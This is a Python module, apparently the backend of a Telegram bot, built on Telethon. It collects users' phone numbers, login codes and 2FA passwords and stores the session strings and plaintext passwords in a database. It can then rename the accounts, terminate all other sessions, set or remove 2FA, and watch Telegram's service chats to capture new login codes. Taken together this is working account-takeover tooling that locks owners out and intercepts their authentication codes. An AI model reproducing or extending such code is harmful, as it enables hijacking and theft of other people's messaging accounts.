import asyncio
import re
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError,
    FloodWaitError, PhoneNumberBannedError, AuthKeyUnregisteredError
)
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
import database
from config import API_ID, API_HASH

pending_clients = {}

async def request_code(user_id: int, phone: str):
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        pending_clients[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash
        }
        return {"success": True}
    except PhoneNumberBannedError:
        return {"success": False, "error": "banned"}
    except FloodWaitError as e:
        return {"success": False, "error": f"flood:{e.seconds}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def submit_code(user_id: int, code: str):
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(phone, username, full_name, session_string)
        del pending_clients[user_id]
        await client.disconnect()
        return {"success": True, "two_fa": False}
    except SessionPasswordNeededError:
        return {"success": True, "two_fa": True}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"success": False, "error": "wrong_code"}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def submit_2fa(user_id: int, password: str):
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(phone, username, full_name, session_string, password)
        del pending_clients[user_id]
        await client.disconnect()
        return {"success": True}
    except PasswordHashInvalidError:
        return {"success": False, "error": "wrong_2fa"}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def get_active_client(phone: str):
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    try:
        client = TelegramClient(StringSession(session["session_string"]), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await database.mark_session_invalid(phone)
            return None
        return client
    except (AuthKeyUnregisteredError, Exception):
        await database.mark_session_invalid(phone)
        return None

async def check_session_valid(phone: str) -> bool:
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return False
    try:
        client = TelegramClient(StringSession(session["session_string"]), API_ID, API_HASH)
        await client.connect()
        authorized = await client.is_user_authorized()
        await client.disconnect()
        if not authorized:
            await database.mark_session_invalid(phone)
        return authorized
    except Exception:
        await database.mark_session_invalid(phone)
        return False

async def change_username(phone: str, new_username: str):
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateUsernameRequest(new_username))
        await database.update_session_username(phone, new_username)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}

async def change_name(phone: str, first_name: str, last_name: str = ""):
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateProfileRequest(first_name=first_name, last_name=last_name))
        full_name = f"{first_name} {last_name}".strip()
        await database.update_session_fullname(phone, full_name)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}

async def terminate_other_sessions(phone: str):
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        from telethon.tl.functions.auth import ResetAuthorizationsRequest
        await client(ResetAuthorizationsRequest())
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}

async def set_two_fa(phone: str, new_password: str, old_password: str = None):
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="",
            email=None
        )
        await database.update_session_two_fa(phone, new_password)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}

async def remove_two_fa(phone: str, current_password: str):
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=current_password,
            new_password=None
        )
        await database.update_session_two_fa(phone, None)
        await client.disconnect()
        return {"success": True}
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e)}

CODE_PATTERN = re.compile(r'\b\d{5}\b')

async def watch_for_new_code(phone: str, timeout: int = 180):
    """
    Opens the saved session and watches for any new message containing
    a 5-digit login code. Checks 777000 and 42777 (login code senders).
    Returns the message text or None on timeout.
    """
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return None

    try:
        client = TelegramClient(StringSession(session["session_string"]), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        
        snapshot = {}
        for sender_id in [777000, 42777]:
            try:
                msgs = await client.get_messages(sender_id, limit=1)
                snapshot[sender_id] = msgs[0].id if msgs else 0
            except Exception:
                snapshot[sender_id] = 0

        deadline = asyncio.get_event_loop().time() + timeout

        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(3)
            for sender_id, last_id in list(snapshot.items()):
                try:
                    new_msgs = await client.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if msg.id > last_id and msg.text and CODE_PATTERN.search(msg.text):
                            await client.disconnect()
                            return msg.text
                    if new_msgs:
                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
                except Exception:
                    pass

        await client.disconnect()
        return None
    except Exception:
        return None
